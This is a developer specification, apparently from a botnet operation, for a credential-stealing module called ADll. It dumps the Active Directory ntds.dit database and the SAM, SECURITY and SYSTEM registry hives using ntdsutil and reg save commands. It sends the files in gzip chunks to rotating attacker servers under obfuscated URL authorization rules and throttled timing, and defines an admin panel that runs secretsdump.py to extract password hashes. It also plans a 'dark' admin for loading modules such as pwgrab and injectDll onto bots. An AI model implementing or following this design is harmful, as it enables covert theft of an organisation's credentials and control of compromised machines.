column1: Sentence
ACTIVE DIRECTORY AND LOCAL WINDOWS ACCOUNTS DUMP MODULE
Technical Specifications
PURPOSE
Data offloading from Active Directory database and local accounts, designed as a module.
PRINCIPLE OF WORK
The module uses the standard `ntdsutil' utility to unload the database.
The data is then uploaded to the server, where it is decrypted and analyzed by the Python package impacket / secretsdump.py
The module performs an Active Directory database dump as described in this article:
https://devteev.blogspot.com/2014/04/hacking-tricks-easy-way-to-get-ntdsdit.html
The module also dumps the HKLM/SAM, HKLM/Security and HKLM/System registry branches.
REALIZATION
The program should be designed as a module according to the modules_HOWTO document.
The name of the module/project is ADll.
Assume that the module operates with SYSTEM rights.
* Before starting work, check whether the Active Directory service is available on the computer.
* If not, send the "AD not found" message and finish the work.
Next, check if the Volume Shadow Copy service is running via WinAPI (analogous to the sc query vss command), and if not, run it (by restarting it via WinAPI).
(analogous to the sc query vss command), and if not, start (restart) this service.
Next, the names of dump files are generated.
There are 4 dump files in total:
ntds.dit
sam.dump
security.dump
system.dump
However, in the file system, these files should have different names:
<prefix>0.dat
<prefix>1.dat
<prefix>2.dat
<prefix>3.dat
The prefix must be formed as a hash of the string ParentInfo.
ParentID
(see module_HOWTO) and satisfy the conditions:
- the value on the input always corresponds to the same value on the output
- the output value cannot be used to recover the input value
- the length of the output hash does not depend on the length of the input string
- the resulting hash contains only alphanumeric characters (human readable and file system friendly)
- the algorithm is simple.
We can propose the following algorithm
- 64-bit unsigned sum of all bytes (treated as unsigned) of ParentInfo.
ParentID field is calculated
- a 64-bit integer is treated as an array of unsigned char filename[8]
- all bytes less than 'a' become 'a'
- all bytes greater than 'Z' become 'Z'.
Thus, if the same string is fed to the input, the output also always contains the same string that looks random.
However, the choice of algorithm is up to the developer.
* the module checks if at least one of these files exists in the %TEMP% directory
If the file(s) are there, it sends them using the file transfer protocol.
The dump described in the next two paragraphs is not performed - because apparently the module didn't finish last time,
and now we are continuing the work.
Next we need to run the command
ntdsutil "ac in ntds" "ifm" "cr fu %temp%\<prefix>0.dat" q q q
If possible, you should implement all actions of this command via WinAPI
(in the second version; in the first version we use the command).
* Dump the HKLM/SAM, HKLM/Security and HKLM/System registry branches with the commands
reg save hklm\sam %temp%\somepath\<prefix>1.dat
reg save hklm\security %temp%\somepath\<prefix>2.dat
reg save hklm\system %temp%\somepath\<prefix>3.dat
The received data dump files are transferred using the file transfer protocol (see the corresponding section).
In this case, compression and file transfer work in a thread with reduced priority (so as not to give peaks of CPU and network load).
Chunks sizes are selected based on the chunksize constant (setting).
By default, the constant size is 10M.
Server addresses are taken randomly from the config (see below).
There should be a pause between sending each chunk of file, chosen randomly from the interval TIMEOUT_MIN...TIMEOUT_MAX.
(compilation time constants).
Sending is done in a single thread.
If sending is unsuccessful (failed to connect; received a response other than HTTP 200 OK; no response at all),
a pause is made for some time (set by compile time constant), the next random server is taken,
and so on until success.
After successful sending, the module sends the WantRelease event to the parent process and goes to sleep in an eternal loop
while(1) Sleep(1000);
waiting for the parent process to terminate the module.
CONFIGS.
The module has a single config named srvad.
The config is a simple text, separated by \r\n.
One line is one URL to which data should be sent.
If no http or https protocol prefix is specified, the port should be extracted from the URL.
If the port is even, it is http, if it is odd, it is https.
For the second version provide work via TOR addresses.
A lightweight library for working via TOR will be provided.
FILE TRANSFER PROTOCOL
The file transfer protocol satisfies the following requirements:
- no peak load on the Internet channel
- the ability to transfer a file in parts.
1) basic information about the computer is sent to the server via HTTP POST in the multipart/form-data container (similar to sending an html form).
The POST contains the following fields:
timestamp - local UNIX time
ip - ParentInfo.
SelfIP field (see module_HOWTO)
ip1 - address of the first network interface
ip2 - address of the second network interface
ipN - address of the N-th network interface
cid - ParentInfo.
ParentID field (see module_HOWTO)
group - ParentInfo.
ParentGroup field (see module_HOWTO)
hostname - host name obtained via GetComputerName()
source - string `ntds'
Sending is to a url of the form:
http://foo.com/<junk>/<auth>/<junk>
junk - arbitrary characters allowed in URI, except slash /
auth - authorization section.
It is assumed that the one who sends the request,
should know the rules for forming this section.
It is a random of any length.
It is obligatory:
- letter Z in any position
- the sum of digits (not numbers!)
from the 6th to the 15th position must be 31.
The characters between them are random.
In particular, Z can be there.
Example section - abcde7ol7k9hi8mZ
2) then each file is sent in parts, by HTTP POST request, in multipart/form-data container.
The file is sent in the file field.
The file name is taken from the Content-Disposition tag; the temporary file name from the URI is ignored.
In this case:
- the file sending starts at the end.
For example, if the file is 100M long, we send the last 10M of the file.
- after sending a chunk of the file and receiving an acknowledgement, the file is truncated - only the unsent chunk remains, starting at the end.
This is done to keep the sending state simple, and to minimize the number of file operations.
You can truncate a file by calling SetEndOfFile().
- Before sending, the piece of file to be sent is read into memory and compressed with the gzip algorithm.
- sending is done to a URL of the form
http://foo.com/<junk>/<auth>/<cid>/<filename>/<start>/<end>/<eof>
where
junk - arbitrary characters allowed in the URI, except for the slash /
auth - authorization section.
This is a random of any length, in which the following is mandatory
- letter S in any position
- the sum of digits (not numbers!)
from the 8th to the 15th position must be 25.
filename - name of the temporary file;
start - initial offset of the transmitted piece relative to the beginning of the file; both letters and digits are allowed here.
But only digits are significant, in the order in which they appear in the string.
For example, 0A is number 0 (digit 0 is significant, letter A is ignored).
end - the final offset of the transmitted chunk relative to the beginning of the file; the rules are the same as for start.
For example, 3A5A2A3A9A5A9A9A is 3523959.
eof is an indication of the end of the file.
If eof is present, this is the last piece of the file; and vice versa (the section is optional)
This is a random of any length in which the mandatory:
- the first digit is even or 0
- last letter A or F
The last character of the file name (before the extension) has the following value:
0 - ntds.dit
1 - sam.dump
2 - security.dump
3 - system.dump
When handling errors, the HTTP response code 200 does not indicate success of the operation,
but a non-200 code indicates a failed operation (e.g., 50* or 40* from the proxy).
The exact operation code is contained within the XML in the body of the HTTP response, inside the <response> tag.
When a response code of the form 4041 is received, the appended character 1 is an internal server error code (enabled only during debugging).
For example, the following response indicates an error code 9:
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Mon, 07 Oct 2019 13:08:44 GMT
Content-Type: application/xml; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept
<?xml version="1.0" encoding="UTF-8"?
<response>4049</response>
Next response - no error, everything is ok
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Mon, 07 Oct 2019 13:08:44 GMT
Content-Type: application/xml; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept
<?xml version="1.0" encoding="UTF-8"?
<response>200</response>
ADMINKA
The use of the received data will be done through the admin area.
Requirements for design are minimal - reasonable simplicity.
The main screen shows a list of the latest received data in table format:
date-time | ClientID| Group | IP | Hostname | Total Size
with paging.
date-time - for the last reception by the selected ClientID (see below about parcel grouping).
Provide filtering by field:
- date-time (range from and to)
- ClientID
- Group
- IP
- Hostname
- Total Size (range from and to)
Interface language - English.
All scripts must not contain Russian strings and variables in Russian (var $issledovanie - bad; var $research - good).
The list should be sorted by header fields.
A record can be opened for viewing; a record can be deleted (after three "Are you sure?"
warnings in increasingly large font and increasingly red color).
The button to delete a record is only available in a record open for viewing.
Adding and editing records is not available.
An open record must list the files contained in the record; each file can be downloaded.
The open record should have a "Analyze Data" button.
An analysis indicator (clock wheel or something like that) should "spin" while the analysis is in progress.
Active Directory data is analyzed by running two scripts:
sudo ./secretsdump.py
-ntds ntds.dit -system SYSTEM -outputfile result local
where ntds.dit and SYSTEM are raw files from the archive received from modules
result - name of the resulting file
Analysis of local accounts:
secretsdump.py -sam sam.dump -security security.dump -system system.dump LOCAL
At the same time, the admin should:
- unload somewhere in a temporary folder the files ntds.dit, sam.dump, security.dump, system.dump that the script needs.
(these files are contained in the record)
- run the scripts by giving them paths to these files
- read stdout, stderr of scripts and output them in a frame on the page
- add a "Download analysis result" button to download the analysis result as .txt or .zip.
To do this, you may have to cache the analysis result or save it in a record.
Installation of the script in Python is approximately as follows:
pip
pip install impacket
pip install impacket --upgrade (if needed)
pip install pycrypto (--upgrade if needed)
pip install pyasn1 (if needed)
apt-get install python-dev (if needed)
ADMINK API
The admin should expose the API to receive data from modules:
POST /api/v1/hello HTTP/1.1
This request creates or updates a record with metadata from a particular client.
There is no file data in it yet
(see FILE TRANSFER PROTOCOL).
POST /api/v1/savef/<cid>/<filename>/<start>/<end>/e
This request saves part of the file (see FILE TRANSFER PROTOCOL).
All answers 200 are OK.
All answers not 200 - error.
Specifying error text is at the discretion of the API developer.
When creating data storage, assume that the size of files can be significant (gigabytes in one parcel).
A data archive always contains the same set of data.
File names can be specified, but to a first approximation these are:
ntds.dit
sam.dump
security.dump
system.dump
When saving data to the database/disk, you should save the date-time of its arrival.
IMPORTANT!
One conditional RECORD in the database generates 4 (four!) files.
Only one file can be transferred per parcel (at best).
Therefore, when saving to the database, it is necessary to group files to the main record by the cid key.
Take into account that transmission of gigabyte packets may take several days.
MODIFICATION OF THE "DARK" ADMIN AREA
You need to modify the "dark" admin so that you can just run modules.
On the screen with bot details (/log/1234) we need to add a list of buttons with the names of frequently used modules, for example
injectDll
pwgrab
importDll
etc.
These names can be taken either from the directory of known modules or hardwired into the code (the former is preferable).
For modules already loaded and running on the bot, the button with its name should work on shutdown (i.e. pressing the button unloads the module).
For modules that are not running, the button loads the module.
Since the reaction to module loading takes several minutes, it is necessary to block the button from being pressed until the bot reacts.
